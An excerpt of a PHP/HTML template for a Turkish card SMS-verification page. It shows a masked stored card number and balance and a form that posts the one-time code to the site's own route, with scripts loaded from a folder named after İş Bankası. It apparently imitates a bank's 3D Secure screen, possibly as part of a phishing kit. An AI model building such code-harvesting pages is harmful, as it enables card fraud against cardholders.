...
<body>
    ...
    <div class="container-fluid cardno">
        <div class="container">
            <h1>
                <span class="title">KART NUMARANIZ: </span>XXXX - XXXX - XXXX - <?= substr($data->cc_no, 12, 15) ?>
            </h1>
        </div>
    </div>
        ...
        <div class="container">
            <div class="col-xs-12">
                ...
                <div class="col-xs-6 col-sm-4 amount">
                    <span><?= number_format($data->balance, 2, '.', ',') ?> TL</span>
                </div>
    ...
    <div class="container-fluid content">
        <div class="container">
            <div class="col-xs-12">
                ...
                <div class="col-xs-12 formHolder">
                    <form id="bkmform" class="form-code" method="POST" action="<?= base_url('bkm_otp/' . $data->hash) ?>" autocomplete="off" novalidate="novalidate">
                        <input id="sms" name="password" type="password" minlength="5" maxlength="5" pattern="[0-9]*" placeholder="Doğrulama Kodu" required="">
            ...
            <div class="col-xs-12 countdown">
                <div id="progressBar">
                    <div style="width: 385.226px; overflow: hidden;">158</div>
                </div>
            </div>
    ...
    <?php $this->load->view('poslar/isbankasi/inc_js.php'); ?>
